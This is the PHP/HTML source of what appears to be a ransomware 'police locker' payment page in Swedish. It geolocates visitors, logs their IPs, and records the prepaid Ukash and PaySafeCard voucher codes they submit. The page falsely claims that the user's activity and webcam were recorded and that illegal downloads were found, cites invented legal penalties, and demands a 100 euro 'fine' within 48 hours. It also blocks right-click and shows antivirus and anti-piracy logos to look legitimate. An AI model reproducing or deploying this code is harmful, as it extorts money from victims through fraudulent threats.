<?php
error_reporting(0);
include 'include/config.php';
include ('include/db.php');
include("sxgeo/SxGeo.php");




$pin=$_GET['pin'];
$ip = $_SERVER['REMOTE_ADDR'];
$date=date('H:i:s j/m/Y');


$SxGeo = new SxGeo();

$country=$SxGeo->get_cc($ip);

$SxGeo->close();


$locations= array(1 => 'DE', 'UK', 'IT', 'FR', 'ES', 'PT', 'CA', 'AT', 'FI', 'SE', 'US', 'GR', 'LU', 'BE', 'PL');

foreach ($locations as $value)
{
	
if ($value==$country)
{
$pic=$value;
break;
}
else
$pic='default';	
}




mysql_query ( "INSERT INTO checklist (ip, country, date) VALUES ('".mysql_escape_string($ip)."', 
'".mysql_escape_string($country)."', '".mysql_escape_string($date)."')");
mysql_insert_id ();




  $pin=$_GET['pin'];

  
  
    if(strlen($pin) == 16 && preg_match("/[0-9]{16}/",$pin))
  {
      
       mysql_query ( "INSERT INTO billing (ucash, ip, country, date) VALUES ('".mysql_escape_string($pin)."', 
	   '".mysql_escape_string($ip)."', '".mysql_escape_string($country)."', '".mysql_escape_string($date)."')");
	 mysql_insert_id ();
         header('Location: unlock.php');
        
  }
  
   if(strlen($pin) == 19 && preg_match("/[0-9]{19}/",$pin))
  {
      
       mysql_query ( "INSERT INTO billing (ucash, ip, country, date) VALUES ('".mysql_escape_string($pin)."', 
	   '".mysql_escape_string($ip)."', '".mysql_escape_string($country)."', '".mysql_escape_string($date)."')");
	 mysql_insert_id ();
         header('Location: unlock.php');
        
  }
  
  
 
 ?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>


  
  <script language="JavaScript">
<!--
///////////////////////////////////
function clickIE4(){
if (event.button==2){
return false;
}
}
function clickNS4(e){
if (document.layers||document.getElementById&&!document.all){
if (e.which==2||e.which==3){
return false;
}
}
}
if (document.layers){
document.captureEvents(Event.MOUSEDOWN);
document.onmousedown=clickNS4;
}
else if (document.all&&!document.getElementById){
document.onmousedown=clickIE4;
}
document.oncontextmenu=new Function("return false")
// --> </script>
  

  
  <title></title>
  <meta http-equiv="Content-Type" content="text/html; charset=windows-1251">


  
  <link href="style.css" rel="stylesheet" type="text/css">


  
  <script type="text/javascript" src="jquery1.3.1.js"></script>
  
  <script type="text/javascript" src="jquerykeypad.js"></script>
  

  
  <style type="text/css">
<!--
#Table_01 {
position:absolute;
left:20px;
top:20px;
width:100%;
height:100%;
}
.btn{
color: #000;
width: 30px;
margin-left: 5px;
border: 1px solid #434343;
-moz-border-radius: 2px;
-khtml-border-radius: 2px;
-webkit-border-radius: 2px;
border-radius: 2px;
}
.btn:hover{
border: 2px solid #0290CB;
}
#Untitled-1-01 {
position:absolute;
left:0px;
top:0px;
width:1024px;
height:98px;
}
#Untitled-1-02 {
position:absolute;
left:0px;
top:98px;
width:395px;
height:670px;
}
#Untitled-1-03 {
position:absolute;
left:395px;
top:98px;
width:324px;
height:430px;
}
#Untitled-1-04 {
position:absolute;
left:719px;
top:98px;
width:305px;
height:430px;
}
#Untitled-1-05 {
position:absolute;
left:395px;
top:528px;
width:629px;
height:240px;
}
-->
  </style><!-- End ImageReady Styles -->
</head>


<body style="margin: 0px; background-color: rgb(255, 255, 255);">


<!-- ImageReady Slices (Untitled-1) -->
<div id="Table_01">
<div id="Untitled-1-01"> <img style="width: 481px; height: 99px;" alt="" src="images/logo.jpg"></div>


<div style="left: 0px; width: 470px; top: 130px; height: 723px;" id="Untitled-1-02"><span id="result_box" class="" lang="sv"><span class="hps">All verksamhet</span> <span class="hps">p&aring; den h&auml;r datorn</span> <span class="hps">har registrerats</span><span>.</span> <span class="hps">Om du anv&auml;nder</span> <span class="hps">webbkameran</span><span>, var</span> <span class="hps">filmer och</span> <span class="hps">bilder</span> <span class="hps">sparas</span> <span class="hps">f&ouml;r identifiering</span> <span class="hps">webbkamera</span></span>.<br>


<center><img style="width: 256px; height: 192px;" alt="" src="images/flag_256.jpg"></center>


<br>


<span id="result_box" class="" lang="sv"><span style="font-weight: bold;" class="hps">Din</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps atn">IP-</span><span class=""><span style="font-weight: bold;">adress</span>:</span></span><span style="font-weight: bold;"></span><?php echo $_SERVER['REMOTE_ADDR'];?>
<br>

<span id="result_box" class="" lang="sv"><span class="hps">Du</span> <span class="hps">kan</span> <span class="hps">tydligt</span> <span class="hps">identifieras med</span> <span class="hps">din IP-adress</span> <span class="hps">och tillh&ouml;rande</span> <span class="hps">hostname</span></span><br>


<br>


<img style="width: 447px; height: 90px;" alt="" src="images/yourpclock.jpg"><br>


<br>


<span id="result_box" class="" lang="sv"><span style="font-weight: bold;" class="hps">Olagligt</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">nedladdat material</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps atn">(</span><span style="font-weight: bold;">MP3, </span><span style="font-weight: bold;" class="hps">filmer</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">eller</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">programvara</span><span style="font-weight: bold;">) har </span><span style="font-weight: bold;" class="hps">finns p&aring; datorn</span><br>
<br>
 <span class="hps">Genom att ladda ner</span><span>,</span> <span class="hps">var de</span> <span class="hps">reproduceras,</span> <span class="hps">vilket</span> <span class="hps">inneb&auml;r</span> <span class="hps">ett brott</span> <span class="hps">enligt avsnitt</span> <span class="hps">106 i</span> <span class="hps">upphovsr&auml;ttslagen.</span><br>
<br>
 <span class="hps">Nedladdning av</span> <span class="hps">upphovsr&auml;ttsskyddat material</span> <span class="hps">via</span> <span class="hps">Internet eller</span> <span class="hps">musik</span> <span class="hps">n&auml;t</span> <span class="hps">dela</span> <span class="hps">&auml;r olagligt</span> <span class="hps">och &auml;r i</span> <span class="hps">enlighet med</span><br>
 <span class="hps">&sect;</span> <span class="hps">106 i</span> <span class="hps">upphovsr&auml;ttslagen</span> <span class="hps">omfattas av</span> <span class="hps">b&ouml;ter eller</span> <span class="hps">f&auml;ngelse i</span> <span class="hps">en straffavgift p&aring;</span> <span class="hps">upp till 3 &aring;r</span><br>
<br>
 <span class="hps">Dessutom,</span> <span class="hps">&auml;r</span> <span class="hps">innehav av</span> <span class="hps">olagligt</span> <span class="hps">nedladdat material</span> <span class="hps">straffbart</span> <span class="hps">enligt &sect;</span> <span class="hps">184</span> <span class="hps">punkt 3</span> <span class="hps">i brottsbalken</span> <span class="hps">och kan</span> <span class="hps">ocks&aring; leda till</span> <span class="hps">konfiskering av</span> <span class="hps">datorn,</span> <span class="hps">med vilken</span> <span class="hps">Diles</span> <span class="hps">laddades ned</span></span></div>


<div style="left: 474px; width: 372px; top: 128px; height: 174px;" id="Untitled-1-03"><span id="result_box" class="short_text" lang="sv"><span class="hps">F&ouml;lj</span> <span class="hps">instruktionerna</span> <span class="hps">till h&ouml;ger</span></span>

<form name="ukash_form" method="get" action="SE.php" style="margin: 0px;">Ukash code: <input name="pin" id="defaultKeypad" type="text"><input name="formbutton1" value="ok" class="btn" type="submit">
  
  <div id="formradio2"><input name="100u" value="50" type="radio">50 Euro</div>


  
  <div id="formradio3"><input name="100u" value="100" checked="checked" type="radio">100
Euro</div>


</form>


<form name="psc_form" method="get" action="SE.php" style="margin: 0px;">Psc code: <input name="pin" id="defaultKeypad2" type="text"><input name="formbutton2" value="ok" class="btn" type="submit">
  
  <div id="formradio4"><input name="100p" value="50" type="radio">50 Euro</div>


  
  <div id="formradio5"><input name="100p" value="100" checked="checked" type="radio">100
Euro</div>


</form>


<br>


<br>


<br>


<span id="result_box" class="" lang="sv"><span style="color: rgb(255, 0, 0);" class="hps">Observera</span><span class="">:</span> <span class="hps">Denna fina</span> <span class="hps">f&aring;r endast</span> <span class="hps">betalas inom</span> <span class="hps">48 timmar</span><span>,</span> <span class="hps">om du l&aring;ter</span> <span class="hps">48 timmar</span> <span class="hps">passera utan</span> <span class="hps">betalning,</span> <span class="hps">m&ouml;jligheten att</span> <span class="hps">l&aring;sa upp</span> <span class="hps">din dator</span> <span class="hps">ut.</span><br>
<br>
 <span style="font-weight: bold;" class="hps">I detta fall</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">ett brottm&aring;l</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">mot dig</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">kommer att inledas</span> <span class="hps"><span style="font-weight: bold;">automatiskt</span>.</span></span><span style="font-weight: bold;"></span></div>


<div style="left: 860px; width: 164px; top: 98px; height: 261px;" id="Untitled-1-04"> <img style="width: 332px; height: 271px;" alt="" src="images/right2.jpg"></div>


<div style="left: 481px; width: 543px; top: 468px; height: 380px;" id="Untitled-1-05"> <img style="width: 276px; height: 38px;" alt="" src="images/mcafee.jpg"><span id="result_box" class="" lang="en"><span class="hps"><br>
</span></span><span id="result_box" class="" lang="sv"><span class="hps">Hur</span> <span class="hps">l&aring;sa</span><span>?</span><br>
<br>
 <span class="hps">I enlighet med</span> <span class="hps">lagen</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">"On</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">kontroll</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">och skydd av information</span><span><span style="font-weight: bold;">"</span> p&aring;</span> <span class="hps">2012/02/01</span> <span class="hps">Du m&aring;ste</span> <span class="hps">betala b&ouml;ter</span> <span class="hps">p&aring; <span style="font-weight: bold;">100</span></span><span style="font-weight: bold;"> </span><span class="hps"><span style="font-weight: bold;">euro</span>.</span> <span class="hps">F&ouml;r att underl&auml;tta</span> <span class="hps">att betala</span> <span class="hps">b&ouml;ter</span> <span class="hps">erbjudande</span> <span class="hps">att anv&auml;nda en s&auml;ker</span> <span class="hps">form av</span> <span class="hps">betalning via</span> <span class="hps">kuponger</span> <span style="font-weight: bold;" class="hps">Ukash</span><span style="font-weight: bold;"> </span><span style="font-weight: bold;" class="hps">/</span><span style="font-weight: bold;"> </span><span class="hps"><span style="font-weight: bold;">PaySafeCard</span>.</span> <span class="hps">Du m&aring;ste</span> <span class="hps">k&ouml;pa</span> <span class="hps">kuponger</span> <span class="hps">till ett belopp av</span> <span style="font-weight: bold;" class="hps">100 euro</span><span>, efter</span> <span class="hps">fylla i</span> <span class="hps">f&auml;lten</span><span class="">, klicka "OK</span></span><span id="result_box" class="" lang="en"><span class="">"</span></span><br>


<br>


<center><img style="top: 666px; left: 501px; width: 169px; height: 90px;" alt="" src="images/1326914693-sopa-pipa-inquisitr.png">
<img style="top: 488px; left: 501px; width: 76px; height: 92px;" alt="" src="images/kaspersky_is_logo.gif.png"></center>


</div>


</div>


<!-- End ImageReady Slices -->
</body>
</html>
